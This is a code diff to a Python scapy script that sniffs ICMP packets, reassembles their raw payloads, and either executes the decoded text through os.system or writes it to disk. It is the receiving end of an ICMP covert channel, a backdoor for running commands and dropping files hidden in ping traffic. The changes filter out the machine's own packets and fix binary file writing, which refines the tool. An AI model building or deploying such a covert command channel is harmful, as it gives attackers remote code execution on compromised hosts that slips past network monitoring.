@@ -20,7 +20,8 @@ def main():
 
     received_content = bytearray()
 
-    rx = sniff(filter="icmp")
+    rx = sniff(filter="icmp", lfilter=lambda pkt: pkt[Ether].src != Ether().src)
+    
     for packet in rx:
         received_payload = packet[Raw]
         received_chunk = bytes(received_payload)
@@ -33,7 +34,7 @@ def main():
         os.system(received_decoded)
     elif mode == '2':
         try:
-            with open(received_file, "w") as file:
+            with open(received_file, "wb") as file:
                 file.write(received_decoded)
         except:
             print('IO Exception:\n')
@@ -41,4 +42,4 @@ def main():
     else:
         print("Mode not supported, wrong input")
 
-main()
+if __name__  == '__main__': main()
